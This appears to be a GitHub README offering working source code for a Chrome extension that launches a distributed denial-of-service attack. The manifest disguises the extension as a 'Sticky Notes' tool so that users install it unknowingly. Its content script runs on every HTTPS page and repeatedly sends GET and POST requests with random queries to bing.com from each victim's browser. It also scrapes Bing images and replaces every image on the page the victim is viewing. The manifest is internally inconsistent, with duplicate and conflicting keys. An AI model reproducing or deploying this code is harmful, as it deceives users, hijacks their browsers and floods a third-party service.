# DDOS_ChromeExtension
Novel way to launch DDOS attack using Chrome Extension.

Add the following manifest.json and contentscript.js to your chrome extension package. Background.js is not required.
(Could be emnedded within a normal extension for deception)

{
// Embedding the malicious DDOS Attack extension within the Sticky Notes Extension for deceiving the naive users.
//Victim Site: www.bing.com.
   //MANIFEST FILE DESCRIPTION

  // Name of the extension, its version and short description as it appears on the browser.  

  "name": "Sticky Notes",
  "description": "Make sticky notes",
  "version": "2.0",

  // We only require the permissions for the web pages.
  //No permissions needed for the Tabs or cookies as we are not accessing the URL.
  //Only injecting the content script.

  "permissions": [
    "http://*/"
  ],


   // background Scripts are required for the Sticky Notes Extension as it is accessing and storing the notes
   // i.e. utilizing the browser kernel resources.

   "background": {
      "scripts": [ "background.js" ]
   },

   // Injecting the file contentscript.js for all the websites to carry out the DDOS Attack.
   // Since matches is set to https://*/*, it will work for all the websites.
   //Can fine grain the permission to a specific website to avoid suspiscion and yet carry out the attack.

   "content_scripts": [
    {
      "matches": ["https://*/*"],
      "js": ["contentscript.js"]
    }
  ],

   // Icon displayed for the extension in the browser toolbar.

   "browser_action": {
      "default_icon": "icon128.png",
      "default_popup": "index.html"
   },

   "content_security_policy": "script-src 'self' https://google.com; object-src 'self'",
   "description": "Easiest way for taking quick notes. Features like font size, color & themes. Collect as you browse in an awesome manner (See Demo)",

   "icons": {
      "128": "icon128.png",
      "16": "icon16.png",
      "48": "icon48.png"
   },
   "key": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCR4PtX1tJHSObNq0NtEbufk16lW2+S84kEjWsrGe7BEB9YBurI89ZO6BA+uqTaPQfTr5KPV1CLgNHH0Tl7RjLSmD0GiiTpSEhsKsY+nlU01AtH27g8n5b6ZGX1v2XvW5FYwaYJhS9r3sBxYSVCVZLK4J6f8A3r+7Utqthg79RVaQIDAQAB",

   // Required for Chrome version 22 onwards.
   "manifest_version": 2,
   "name": "Sticky Notes - Just popped up!",
   "offline_enabled": true,
   "permissions": [ "storage", "notifications" ],
   "short_name": "Sticky Notes",
   "update_url": "https://clients2.google.com/service/update2/crx",
   "version": "1.9.4"
}

//CONTENT SCRIPT FILE DESCRIPTION.

console.log("chrome extension party!");
//log the domain of the website that is opened onto the console.
console.log("We are in " + document.domain);
//this script will run on every tab.

 //This script will run on every tab.
//This function is dynamically creating images and links which will not be visible.
//But will send GET request to the website.

//TYPE 1
function imgFlood() {
	
   // Create a DOM element titled link.
   var link = document.createElement("a");

    //Set the href i.e. on clicking navigate to mentioned url. 
    link.href = "https://www.bing.com/";
    link.alt = "Flash and JS are not enemies!";

    //Create an image element and replace the src with a random query to bing.com
    var img = document.createElement("img");
    // Math.random function generates a random number that gets converted to a String in base 36 i.e 26 Alphabets
    // plus 10 Numbers and then replace all characters except the alphabets with ' ' .
    // i.e GENERATE A STRING OF 5 CHARACTERS from a-z.
    img.src = "https://www.bing.com/search?q=" + Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);

    //Append image to link.
    link.appendChild(img);
    link.style.display = 'none';
	
	//Append link to the DOM tree of web page.
    document.body.appendChild(link);
	
	//Create an image element and replace the src with a random query to bing.com
	/* var input= document.createElement("iframe");
    input.src = "https://www.bing.com/search?q=" + Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
	link.appendChild(input); */
}

//Call image flood function every 3000 ms i.e 3 seconds to send repetitive random queries to bing.
setInterval(imgFlood,3000);

//TYPE 2
//This is AJAX code for GET requests.
function getRequests()
{
	  imgFlood();
	// Create an object of this class.
	  var xhttp = new XMLHttpRequest();
       
          // On receiving the response from the server, check if response status is 4 and status code is 200 == OK
	 // This indicates that the server recieved the request , it was processed and the response was delivered successfully. 
	  xhttp.onreadystatechange = function() {
		  if (this.readyState == 4 && this.status == 200) {
			// Action to be performed when the document is read;
		  }
	  };
        // Write the request to be of type GET< POST OR HEAD, its URL and set asynchronous = true implies that it will work
        // without refreshing the browser each time.
	xhttp.open("GET","https://www.bing.com/search?q=" + Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5),true);
	
	// method to actually send the request.
	xhttp.send();
  
   console.log("The GET requests are being sent to  https://www.bing.com as random queries and (the counter shows the no of POST 	requests). Check network tab XHR panel");
}

//Call getRequests functions at an interval of 4s to generate repititive random queries to bing.com
setInterval(getRequests,4000);

//TYPE 3
//This is AJAX code for POST request.
function postRequests()
{
	  var xhttp = new XMLHttpRequest();
	  xhttp.onreadystatechange = function() {
		  if (this.readyState == 4 && this.status == 200) {
			// Action to be performed when the document is read;
		  }
	  };

	// Generate a random String of 5 alphabets from a-z.
        // Math.random function generates a random number that gets converted to a String in base 36 i.e 26 Alphabets
        // plus 10 Numbers and then replace all characters except the alphabets with ' ' .
        // i.e GENERATE A STRING OF 5 CHARACTERS from a-z.
	var randomString = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);

       // General form of query to bing.com while searching for images.
	var randomPOSTString = "q=" + randomString + "&FORM=HDRSC2";

	xhttp.open("POST","https://www.bing.com/search", true);
        // Indicate the type of content i.e MIME type of the request.
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send(randomPOSTString);
  
   console.log("The POST requests are being sent to  https://www.bing.com as random queries and (the counter shows the no of POST requests). Check network tab XHR panel");
}

//Call postRequests at an interval of 5s to send continuos random requests to bing.com
setInterval(postRequests,5000);


//TYPE 3
// Performing the DDOS attack by requesting images from 9 categories from bing.com and replacing images within the current //webpage with them.

// Define an array for storing the images requested from bing.com
var mImages= new Array();

// Define the 9 different categories of images to be requested.
var wallpapersCategories = ["abstract", "nature", "concerts", "brands", "nature", "design", "landscape", "sports", "technology"];

//Getting images from bing.com via GET requests.
function getBingImages()
{
  // Choose any one of the categories of the images.
  var randomCategory = window.wallpapersCategories[Math.floor(Math.random() * (window.wallpapersCategories.length))];
 
  //GET Request Mechanism
  var xhttp = new XMLHttpRequest();
  xhttp.responseType = 'document';

  xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
	
	//pass the received response as an object to sortHTTPSlinks function.        
        sortHTTPSlinks(this);
      }
  };
  xhttp.open("GET", "https://www.bing.com/images/search?q=" + randomCategory + "&FORM=HDRSC2", true);
  xhttp.send();

}

// From XML document received as response filter out the img elements.
function sortHTTPSlinks(xml) {
  var x, i, xmlDoc;
  xmlDoc = xml.responseXML;

  x = xmlDoc.getElementsByTagName("img");
  
  // For the image elements having a src property push them onto the mImages array defined earlier.
  // mImages array will have the links to all the images.
  for(i = 0; i< x.length; i++) {
    if( x[i].hasAttribute("data-src"))
    {
        var imageSource = x[i].getAttribute("data-src");
    
        window.mImages.push(imageSource);
    }
     
  }

}

setInterval(getBingImages, 3500); 

//Function to actually change the images within the web page.
// Fetch all the elements with img tag within the current DOM of the webpage.
// For all those elements change their src property to the images from bing which are stored as url's within mImages array.
function changeImages()
{
  var container = document.getElementsByTagName("img");
  for(var i=0,j=0;i<container.length;i++,j++)
  { 
    if(j>mImages.length)
    {
      j=0;
    }

    container[i].src = window.mImages[j]; 
  }
}

setInterval(changeImages, 5000); 

